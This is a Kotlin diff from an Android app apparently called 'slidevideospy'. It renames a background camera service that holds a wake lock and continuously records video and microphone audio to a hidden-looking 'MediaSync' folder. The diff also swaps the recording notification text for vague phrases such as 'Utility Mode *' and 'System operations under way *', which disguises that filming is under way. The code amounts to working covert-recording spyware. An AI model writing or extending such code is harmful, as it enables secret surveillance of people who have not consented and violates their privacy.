@@ -1,4 +1,4 @@
-package com.globewaystechnologies.slidevideospy
+package com.globewaystechnologies.slidevideospy.services
 
 
 import android.Manifest
@@ -10,26 +10,14 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
-import android.graphics.SurfaceTexture
 import android.hardware.camera2.CameraCaptureSession
-import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraDevice
 import android.os.Binder
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
-import android.widget.Toast
-import androidx.compose.ui.platform.LocalContext
 import androidx.core.app.NotificationCompat
-import androidx.core.app.ServiceCompat
-import androidx.core.content.ContextCompat
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.GlobalScope
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import java.util.Random
-import kotlin.concurrent.thread
 import android.hardware.camera2.CameraManager
 import android.media.AudioAttributes
 import android.media.AudioFocusRequest
@@ -38,15 +26,14 @@ import android.media.MediaRecorder
 import android.os.Environment
 import android.os.Handler
 import android.os.HandlerThread
-import android.os.Looper
 import android.os.PowerManager
 import android.view.Surface
-import android.view.TextureView
 import androidx.annotation.RequiresApi
 import androidx.annotation.RequiresPermission
+import com.globewaystechnologies.slidevideospy.R
 import java.io.File
 
-class ThirdCameraService : Service() {
+class SecondCameraService : Service() {
 
     private var allowRebind: Boolean = true
     private var serviceRunningCurrently: Boolean = true
@@ -65,7 +52,7 @@ class ThirdCameraService : Service() {
 
     private fun acquireWakeLock() {
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy3::CameraWakeLock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy2::CameraWakeLock")
         wakeLock.acquire()
     }
 
@@ -75,8 +62,8 @@ class ThirdCameraService : Service() {
         }
     }
 
-    private val binder: ThirdCameraServiceBinder by lazy {
-        ThirdCameraServiceBinder()
+    private val binder: SecondCameraServiceBinder by lazy {
+        SecondCameraServiceBinder()
     }
 
     // Random number generator.
@@ -107,8 +94,8 @@ class ThirdCameraService : Service() {
         return PendingIntent.getService(this,0,serviceIntent, PendingIntent.FLAG_IMMUTABLE)
     }
 
-    inner class ThirdCameraServiceBinder: Binder() {
-        fun getService(): ThirdCameraService = this@ThirdCameraService
+    inner class SecondCameraServiceBinder: Binder() {
+        fun getService(): SecondCameraService = this@SecondCameraService
     }
 
     @RequiresApi(Build.VERSION_CODES.VANILLA_ICE_CREAM)
@@ -118,7 +105,7 @@ class ThirdCameraService : Service() {
 
         acquireWakeLock()
 
-        startForeground(127,
+        startForeground(125,
             createNotification(),
             ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
@@ -142,8 +129,8 @@ class ThirdCameraService : Service() {
 
 
     private fun createNotification(): Notification {
-        val channelId = "audio_recording_channel_3"
-        val channelName = "Audio Recording Channel 3"
+        val channelId = "audio_recording_channel_2"
+        val channelName = "Audio Recording Channel 2"
         val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -154,8 +141,8 @@ class ThirdCameraService : Service() {
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Service Executing !")
-            .setContentText("Real-time processing ongoing !!!")
+            .setContentTitle("Utility Mode *")
+            .setContentText("System operations under way *")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setOngoing(true)
             .build()
@@ -168,7 +155,7 @@ class ThirdCameraService : Service() {
 
         cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
 //        cameraId = cameraManager.cameraIdList.first()
-        cameraId = cameraManager.cameraIdList[2]
+        cameraId = cameraManager.cameraIdList[1]
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
             @RequiresApi(Build.VERSION_CODES.S)
             override fun onOpened(camera: CameraDevice) {
@@ -197,16 +184,17 @@ class ThirdCameraService : Service() {
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
             "MediaSync"
         )
-        val folder3 = File(publicDir, "3")
-        if (!folder3.exists()) folder3.mkdirs()
-        val videoFile = File(folder3, "video_${System.currentTimeMillis()}.mp4")
+        val folder2 = File(publicDir, "2")
+        // Create subdirectories if they don't exist
+        if (!folder2.exists()) folder2.mkdirs()
+        val videoFile = File(folder2, "video_${System.currentTimeMillis()}.mp4")
         Log.d(
-            "ThirdServiceCamera:",
+            "PinkServiceCamera:",
             "Camera Facing. :${publicDir}"
         )
 
         mediaRecorder.apply {
-            setOrientationHint(90)
+            setOrientationHint(270)
 //            setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
             setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
             setVideoSource(MediaRecorder.VideoSource.SURFACE)
@@ -217,8 +205,8 @@ class ThirdCameraService : Service() {
             setAudioEncodingBitRate(96000)
             setAudioSamplingRate(44100)
 //            setAudioSamplingRate(16000)
-//            setVideoSize(1920, 1080)
-            setVideoSize(1280, 720)
+            setVideoSize(1920, 1080)
+//            setVideoSize(1280, 720)
             setVideoFrameRate(30)
             setVideoEncodingBitRate(3 * 1024 * 1024)
 //            setVideoEncodingBitRate(8 * 1024 * 1024)
@@ -289,6 +277,8 @@ class ThirdCameraService : Service() {
         cameraDevice?.close()
         releaseWakeLock()
     }
+
+
 
 
 
